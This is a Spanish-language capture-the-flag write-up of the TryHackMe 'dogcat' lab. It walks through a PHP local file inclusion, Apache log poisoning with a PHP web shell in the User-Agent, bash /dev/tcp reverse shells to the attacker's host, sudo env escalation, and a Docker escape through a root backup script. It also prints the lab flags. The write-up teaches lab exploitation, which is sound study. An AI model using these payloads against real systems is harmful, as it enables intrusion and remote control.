---
layout: single
title: Dogcat - TryHackMe
excerpt: "En este post vamos a resolver la maquina dogcat de la plataforma de Tryhackme que es de categoria media donde vamos a tener que aprovecharnos de un LFI para de hay hacer un Log Poisoning mediante en User-Agent inyectar codigo php para ganar acceso a un contenedor despues de ingresar al contenedor tendremos que aprovecharnos de un script que se ejecuta cada cierto tiempo vamos a sobrescribir el archivo para que nos envie una shell y poder ver la ultima flag que esta fuera del contenedor"
date: 2023-05-16
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/try-writeup-dogcat/icon.png
  teaser_home_page: true
  icon: /assets/images/tryhackme.webp
categories:
  - TryHackMe
  - infosec
tags:  
  - LFI
  - Log Poisoning
  - Docker Breakout
  - Cron Job

---

Maquina Linux 

```bash
❯ ping -c 1 10.10.80.113
PING 10.10.80.113 (10.10.80.113) 56(84) bytes of data.
64 bytes from 10.10.80.113: icmp_seq=1 ttl=61 time=241 ms

--- 10.10.80.113 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 241.222/241.222/241.222/0.000 ms
❯ whichSystem.py 10.10.80.113

10.10.80.113 (ttl -> 61): Linux
```

## PortScan

```bash
❯ sudo nmap -sCV -p22,80 10.10.80.113 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-16 19:18 CST
Nmap scan report for 10.10.80.113
Host is up (0.23s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 2431192ab1971a044e2c36ac840a7587 (RSA)
|   256 213d461893aaf9e7c9b54c0f160b71e1 (ECDSA)
|_  256 c1fb7d732b574a8bdcd76f49bb3bd020 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: dogcat
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeracion

Estas son las tecnologias que corren en el puerto **80** que corresponden a la pagina web 

```ruby
❯ whatweb http://10.10.80.113
http://10.10.80.113 [200 OK] Apache[2.4.38], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[10.10.80.113], PHP[7.4.3], Title[dogcat], X-Powered-By[PHP/7.4.3]
```

Esta es la pagina web y nos esta dando a elegir entre la opcion **A dog** o **A cat**

![](/assets/images/try-writeup-dogcat/web1.png)

Si elegimos **A cat** nos muestra esto

![](/assets/images/try-writeup-dogcat/web2.png)

Si vemos bien el `url` con **view** le esta indicando la opcion **dog** en la pagina web de **Tryhackme** donde te unes al room para poder hacer la maquina el creador te dice hizo el sitio para mostrar imagenes de un perro o un gato con **PHP** y bueno tambien nos dice que es vulnerable a **LFI** asi que vamos a probar algo basico

Si intentamos `/etc/passwd` de primeras no pasa nada solo nos dice que acepta perros o gatos

![](/assets/images/try-writeup-dogcat/web3.png)

Si intentamos un `Directory traversal` para retroceder varios directorios asi atras tampoco funciona

![](/assets/images/try-writeup-dogcat/web4.png)

Bueno vamos antes de probar mas formas de explotar este `LFI` ya que en cierta parte esta algo sanitizado el codigo de primeras vamos a emplear `Fuzzing` para ver si algunas rutas que podamos ver y de bueno vemos esto que nos devuelve un **200** 

```bash
❯ wfuzz -c --hc=404 --hw=44 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt 'http://10.10.80.113/?view=FUZZ'
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.80.113/?view=FUZZ
Total requests: 62283

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                        
=====================================================================

000000049:   200        23 L     74 W       759 Ch      "category"                                                     
000000063:   200        23 L     74 W       757 Ch      "catalog"                                                      
000000151:   200        23 L     74 W       769 Ch      "catalogsearch"           
```

Y bueno ya estamos viendo mas informacion

![](/assets/images/try-writeup-dogcat/web5.png)

Vemos que esta usando `include` y un **category.php**

![](/assets/images/try-writeup-dogcat/web6.png)

## Local File Inclusion 

Despues de investigar y probar algunas rutas de [HackTricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion#lfi2rce) vi que se pueden usar **php://filter** y ademas podemos usar un metodo de conversion que es **convert.base64-encode** ademas de la imagen si en `view` indicas **dogcat** le esta añadiento el `.php`

![](/assets/images/try-writeup-dogcat/web7.png)

[Aqui puedes encontrar mas informacion](https://medium.com/@Aptive/local-file-inclusion-lfi-web-application-penetration-testing-cc9dc8dd3601)

Bueno si probamos nos devuelve una cadena en `base64` algo larga (eso dijo ella) 

![](/assets/images/try-writeup-dogcat/web8.png)

```bash
❯ echo -n 'PCFET0NUWVBFIEhUTUw+CjxodG1sPgoKPGhlYWQ+CiAgICA8dGl0bGU+ZG9nY2F0PC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9Ii9zdHlsZS5jc3MiPgo8L2hlYWQ+Cgo8Ym9keT4KICAgIDxoMT5kb2djYXQ8L2gxPgogICAgPGk+YSBnYWxsZXJ5IG9mIHZhcmlvdXMgZG9ncyBvciBjYXRzPC9pPgoKICAgIDxkaXY+CiAgICAgICAgPGgyPldoYXQgd291bGQgeW91IGxpa2UgdG8gc2VlPzwvaDI+CiAgICAgICAgPGEgaHJlZj0iLz92aWV3PWRvZyI+PGJ1dHRvbiBpZD0iZG9nIj5BIGRvZzwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iLz92aWV3PWNhdCI+PGJ1dHRvbiBpZD0iY2F0Ij5BIGNhdDwvYnV0dG9uPjwvYT48YnI+CiAgICAgICAgPD9waHAKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICAkZXh0ID0gaXNzZXQoJF9HRVRbImV4dCJdKSA/ICRfR0VUWyJleHQiXSA6ICcucGhwJzsKICAgICAgICAgICAgaWYoaXNzZXQoJF9HRVRbJ3ZpZXcnXSkpIHsKICAgICAgICAgICAgICAgIGlmKGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICdkb2cnKSB8fCBjb250YWluc1N0cigkX0dFVFsndmlldyddLCAnY2F0JykpIHsKICAgICAgICAgICAgICAgICAgICBlY2hvICdIZXJlIHlvdSBnbyEnOwogICAgICAgICAgICAgICAgICAgIGluY2x1ZGUgJF9HRVRbJ3ZpZXcnXSAuICRleHQ7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGVjaG8gJ1NvcnJ5LCBvbmx5IGRvZ3Mgb3IgY2F0cyBhcmUgYWxsb3dlZC4nOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgPz4KICAgIDwvZGl2Pgo8L2JvZHk+Cgo8L2h0bWw+Cg==' | base64 -d
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	   $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
    </div>
</body>

</html>
```

Y bueno pues ya podemos ver el codigo que se esta empleado por detras cuando tu pones **dog or cat** se verifica con el parametro `view` que tenga el valor de **dog o cat** si es asi se incluye el archivo que corresponde como **dog.php o cat.php** y si no pues te muestra un error que es el que veiamos que solo podiamos elegir perros o gatos y la variable `$ext` verifica la extension del archivo

Bueno aprovechandonos del **LFI** ya podemos cargar el `/etc/passwd` de esta otra forma 

```bash
❯ curl -s 'http://10.10.80.113/?view=dog/../../../../../../etc/passwd&ext=' | tail -n 23 | grep -vE "</div>|</html>|</body>"
        Here you go!root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```

## Log Poisoning

Bueno como tenemos un `LFI` podemos ver los **logs** de **Apache** en la ruta `/var/log/apache2/access.log` y si funciona podemos verlos

```bash
http://10.10.80.113/?view=php://filter/resource=./dog/../../../../../../../var/log/apache2/access.log&ext=
```

![](/assets/images/try-writeup-dogcat/web9.png)

Ahora la parte que debemos modificar para inyectar codigo **php** es la del `User-Agent` la cual vamos a inyectar esta linea de codigo para ganar acceso ala maquina `<?php system($_GET['cmd']); ?>`

Vamos a capturar la peticion con `Burpsuite` para hacerlo mas comodo y mejor

![](/assets/images/try-writeup-dogcat/web10.png)

Ahora vamos a ejecutar el comando `whoami` para validar que hicimos bien el `Log Poisoning` 

![](/assets/images/try-writeup-dogcat/web11.png)

>Puedes leer las flags aprovechandote del parametro `cmd` pero bueno no se si **TryHackme** permita mostrar las **flags** pero mejor lo haremos ya estando en la maquina 

Ahora vamos a ganar acceso

```bash
❯ sudo nc -nlvp 443
listening on [any] 443 ...


```

```bash
view-source:http://10.10.80.113/?view=php://filter/resource=./dog/../../../../../../../var/log/apache2/access.log&ext=&cmd=bash -c 'bash -i >%26 /dev/tcp/tuip/443 0>%261'
```

Nos llega la shell 

```bash
❯ sudo nc -nlvp 443
listening on [any] 443 ...
connect to [10.2.28.226] from (UNKNOWN) [10.10.80.113] 35812
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@9df076ee9626:/var/www/html$ whoami
whoami
www-data
www-data@9df076ee9626:/var/www/html$ 
```

## Shell www-data

Despues de hacer un tratamiento de la `tty`

```bash
❯ sudo nc -nlvp 443
listening on [any] 443 ...
connect to [10.2.28.226] from (UNKNOWN) [10.10.80.113] 35812
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@9df076ee9626:/var/www/html$ whoami
whoami
www-data
www-data@9df076ee9626:/var/www/html$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@9df076ee9626:/var/www/html$ ^Z
zsh: suspended  sudo nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  sudo nc -nlvp 443
                                   reset xterm
ENTER
www-data@9df076ee9626:/var/www/html$ export TERM=xterm
```

## Flag 1 

Pues verificando hay otros creadores de contenido los cuales mostraron las flags y no tuvieron problemas pues aqui esta la primer flag 

```bash
www-data@9df076ee9626:/var/www/html$ ls
cat.php  cats  dog.php	dogs  flag.php	index.php  style.css
www-data@9df076ee9626:/var/www/html$ cat flag.php 
<?php
$flag_1 = "THM{Th1s_1s_N0t_4_Catdog_ab67edfa}"
?>
www-data@9df076ee9626:/var/www/html$ 

```

## Flag 2 

```bash
www-data@9df076ee9626:/var/www$ ls
flag2_QMW7JvaY2LvK.txt	html
www-data@9df076ee9626:/var/www$ cat flag2_QMW7JvaY2LvK.txt 
THM{LF1_t0_RC3_aec3fb}
www-data@9df076ee9626:/var/www$ 

```

## Escalada de Privilegios Docker 

Vemos el binario `env` que ya podriamos ir a [GTFObins](https://gtfobins.github.io/gtfobins/env/#suid) por que es **SUID**

```bash
www-data@9df076ee9626:/$ find \-perm -4000 2>/dev/null | grep -v "snap"
./bin/mount
./bin/su
./bin/umount
./usr/bin/chfn
./usr/bin/newgrp
./usr/bin/passwd
./usr/bin/chsh
./usr/bin/env
./usr/bin/gpasswd
./usr/bin/sudo
www-data@9df076ee9626:/$ 
```

Si hacemos un `sudo -l` vemos que es lo mismo 

```bash
www-data@9df076ee9626:/$ sudo -l
Matching Defaults entries for www-data on 9df076ee9626:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on 9df076ee9626:
    (root) NOPASSWD: /usr/bin/env
www-data@9df076ee9626:/$ 
```

Ahora vamos a convertirnos en `root`

```bash
www-data@9df076ee9626:/$ sudo -u root /usr/bin/env /bin/sh
# whoami
root
# hostname -I
172.17.0.2 
# 
``` 

Estamos en un contenedor 

## Flag 3 

```bash
# cd /root
# ls
flag3.txt
# cat flag3.txt 
THM{D1ff3r3nt_3nv1ronments_874112}
# 
```

 Despues de estar enumerando la maquina vemos que hay un script `.sh` en la ruta **/opt/backups** y bueno este script esta genera un `backup.tar` pero como estamos como root podemos agregar una instruccion al script para que nos mando una reverse shell 

```bash
# cd /opt
# pwd
/opt
# ls
backups
# cd backups
# ls
backup.sh  backup.tar
# ls -l backup.sh
-rwxr--r-- 1 root root 69 Mar 10  2020 backup.sh
# cat backup.sh
#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container
# 
```

```bash
# echo "/bin/bash -c 'bash -i >& /dev/tcp/10.2.28.226/443 0>&1'" >> /opt/backups/backup.sh
# cat backup.sh
#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container
/bin/bash -c 'bash -i >& /dev/tcp/10.2.28.226/443 0>&1'
# 
``` 

Ahora nos ponemos en escucha para que llegue la shell 

```bash
❯ sudo nc -nlvp 443
listening on [any] 443 ...

``` 

## Root en dogcat 

```bash
❯ sudo nc -nlvp 443
[sudo] password for miguel7: 
listening on [any] 443 ...
connect to [10.2.28.226] from (UNKNOWN) [10.10.80.113] 59488
bash: cannot set terminal process group (6150): Inappropriate ioctl for device
bash: no job control in this shell
root@dogcat:~# whoami
whoami
root
root@dogcat:~# hostname -I 
hostname -I
10.10.80.113 172.17.0.1 
root@dogcat:~# 
``` 

## flag 4 

```bash
root@dogcat:~# cat flag4.txt
cat flag4.txt
THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}
root@dogcat:~# 
```
